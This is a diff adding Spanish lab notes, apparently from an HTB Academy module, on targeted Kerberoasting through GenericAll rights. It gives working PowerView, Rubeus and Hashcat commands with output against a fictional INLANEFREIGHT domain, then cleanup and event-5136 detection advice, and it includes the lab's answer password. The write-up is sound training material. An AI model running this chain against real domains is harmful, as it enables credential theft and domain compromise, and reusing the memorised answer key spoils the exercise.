@@ -480,3 +480,161 @@ spergazed
 damundsen
 dpayne
 ```
+
+Si tenemos **permisos `GenericAll` sobre una cuenta** (en este caso, `adunn`) pero no podemos interrumpir su uso (por ser cuenta administrativa), podemos realizar un **Kerberoasting dirigido** creando un **SPN falso**.
+
+1. **Requisitos previos**:    
+    - Debemos estar autenticados como miembro del grupo `Information Technology`.        
+    - Tenemos acceso a través de pertenencia anidada (ej: añadimos `damundsen` a `Help Desk Level 1`).        
+2. **Técnica**:    
+    - Modificamos el atributo `servicePrincipalName` de `adunn` para asignar un SPN controlado por nosotros.        
+    - Solicitamos el TGS correspondiente.        
+    - Crackeamos el hash offline con Hashcat.        
+3. **Herramientas**:    
+    - Desde Windows: `Set-DomainObject` (PowerView).        
+    - Desde Linux: `targetedKerberoast` (automatiza SPN → solicitud TGS → limpieza).
+
+
+##### Creando un SPN falso
+
+```powershell
+PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+
+VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
+VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
+VERBOSE: [Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
+VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
+VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
+(&(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))
+VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object 'adunn'
+```
+
+> Si esto ha funcionado, también podremos hacer Kerberoasting sobre el usuario usando cualquier número de métodos y obtener el hash para crackearlo offline. 
+
+##### Kerberoast con Rubeus
+
+```powershell
+PS C:\htb> .\Rubeus.exe kerberoast /user:adunn /nowrap
+
+..SNIP..
+
+[*] SamAccountName         : adunn
+[*] DistinguishedName      : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+[*] ServicePrincipalName   : notahacker/LEGIT
+[*] PwdLastSet             : 3/1/2022 11:29:08 AM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$ <SNIP>
+```
+
+¡Genial! Hemos obtenido con éxito el hash. El último paso es intentar crackear la contraseña offline utilizando Hashcat. Una vez que tengamos la contraseña en texto claro, podremos autenticarnos como el usuario `adunn` y llevar a cabo el ataque DCSync, el cual se abordará en la siguiente sección.
+
+### Limpieza
+
+En términos de limpieza, hay algunas cosas que tendremos que hacer.
+
+1. Eliminar el SPN falso que creamos en la cuenta `adunn`.    
+2. Eliminar al usuario `damundsen` del grupo **Help Desk Level 1**.    
+3. Restaurar la contraseña original del usuario `damundsen` (si la conocemos) o pedir al cliente que la restablezca o informe al usuario.    
+
+> ⚠️ Este orden es importante, ya que si eliminamos antes al usuario del grupo, perderemos los permisos necesarios para eliminar el SPN falso.
+
+Primero, eliminamos el SPN falso de la cuenta `adunn`
+
+##### Eliminando el SPN falso de la cuenta `adunn`
+
+```powershell
+PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
+
+VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
+VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
+VERBOSE: [Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
+VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
+VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
+(&(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))
+VERBOSE: [Set-DomainObject] Clearing 'serviceprincipalname' for object 'adunn'
+```
+
+Ahora, eliminaremos al usuario del grupo usando la función `Remove-DomainGroupMember`
+
+##### Eliminando `damundsen` del grupo Help Desk Level 1
+
+```powershell
+PS C:\htb> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
+
+VERBOSE: [Get-PrincipalContext] Using alternate credentials
+VERBOSE: [Remove-DomainGroupMember] Removing member 'damundsen' from group 'Help Desk Level 1'
+True
+```
+
+Lo confirmamos:
+
+```powershell
+PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
+```
+
+Aunque realicemos una limpieza completa, es fundamental documentar cada modificación en el informe final. El cliente necesita conocer todos los cambios realizados en su entorno, y dejar constancia escrita nos protege ante posibles dudas futuras. El ejemplo mostrado es solo una de muchas posibles rutas de ataque que pueden encontrarse en un dominio real, algunas más simples y otras más complejas. Aunque este caso sea ficticio, rutas similares aparecen en auditorías reales, especialmente mediante ataques basados en ACL. Sin embargo, si la cadena de ataque resulta demasiado larga o arriesgada, es preferible limitarse a enumerar el camino y proporcionar pruebas suficientes al cliente para que entienda el problema y pueda corregirlo.
+
+### Detección y remediación
+
+- **Auditar y eliminar ACLs peligrosas**  
+    Es recomendable realizar auditorías periódicas de Active Directory y formar al personal interno para usar herramientas como BloodHound que permitan detectar y eliminar ACLs potencialmente peligrosas.
+    
+- **Supervisar la pertenencia a grupos**  
+    Es fundamental tener visibilidad sobre los grupos críticos del dominio. Cualquier cambio en estos grupos debe alertar al equipo de IT, ya que puede ser un indicio de una cadena de ataque basada en ACLs.
+    
+- **Auditar y monitorizar cambios en las ACLs**  
+    Activar la política avanzada de auditoría de seguridad ayuda a detectar modificaciones sospechosas, en especial el **evento 5136**, que indica que se ha modificado un objeto del directorio. Esto puede señalar un cambio en los permisos vinculado a un ataque.
+
+##### Viendo el ID de evento 5136
+
+![[Pasted image 20250722101119.png]]
+Si vamos a la pestaña `Details`, veremos que la información pertinente está escrita en [SDDL](https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language), que no es legible para nosotros. Vemos los SDDL asociados:
+
+![[Pasted image 20250722101222.png]]
+
+Podemos usar el cmdlet [ConvertFrom-SddlString](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/convertfrom-sddlstring?view=powershell-7.2) para convertir esto a un formato legible:
+
+```powershell-session
+PS C:\htb> ConvertFrom-SddlString "O:BAG:BAD:AI(D;;DC;;;WD)...SNIP..." 
+
+Owner            : BUILTIN\Administrators
+Group            : BUILTIN\Administrators
+DiscretionaryAcl : {Everyone: AccessDenied (WriteData), Everyone: AccessAllowed (WriteExtendedAttributes), NT
+                   AUTHORITY\ANONYMOUS LOGON: AccessAllowed (CreateDirectories, GenericExecute, ReadPermissions,
+                   Traverse, WriteExtendedAttributes), NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS: AccessAllowed
+                   (CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions,
+                   WriteExtendedAttributes)...}
+SystemAcl        : {Everyone: SystemAudit SuccessfulAccess (ChangePermissions, TakeOwnership, Traverse),
+                   BUILTIN\Administrators: SystemAudit SuccessfulAccess (WriteAttributes), INLANEFREIGHT\Domain Users:
+                   SystemAudit SuccessfulAccess (WriteAttributes), Everyone: SystemAudit SuccessfulAccess
+                   (Traverse)...}
+RawDescriptor    : System.Security.AccessControl.CommonSecurityDescriptor
+```
+
+Si filtramos por la propiedad `DiscretionaryAcl`, podemos observar que probablemente se ha concedido al usuario `mrb3n` privilegios de `GenericWrite` sobre el objeto del dominio, lo cual podría ser un indicio de un intento de ataque. Existen muchas herramientas que pueden utilizarse para monitorizar Active Directory. Combinadas con una postura de seguridad madura y con las capacidades nativas del sistema para auditar y generar alertas, pueden ser muy útiles para detectar este tipo de ataques y frenar su progresión. En la siguiente sección se explicará el ataque DCSync, que es la consecuencia directa del camino de ataque que acabamos de recorrer y una técnica habitual para comprometer por completo un dominio.
+
+##### _Work through the examples in this section to gain a better understanding of ACL abuse and performing these skills hands-on. Set a fake SPN for the adunn account, Kerberoast the user, and crack the hash using Hashcat. Submit the account's cleartext password as your answer._
+
+> **Respuesta**: SyncMaster757
+
+Dado que tenemos permisos `GenericAll` sobre esta cuenta, podemos llevar a cabo un ataque Kerberoasting dirigido modificando su atributo `servicePrincipalName` para registrar un SPN falso. Esto nos permitirá solicitar un ticket TGS, extraerlo y tratar de crackearlo offline utilizando Hashcat.
+
+```powershell
+Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+```
+
+![[Pasted image 20250722101713.png]]
+
+```powershell
+.\Rubeus.exe kerberoast /user:adunn /nowrap
+```
+
+![[Pasted image 20250722101723.png]]
+
+Guardamos como un TGS y lo intentamos adivinar con Hashcat:
+
+```bash
+hashcat -m 13100 adunn_TGS /usr/share/wordlists/rockyou.txt
+```
+
+Tras un rato, vemos la contraseña crackeada. 
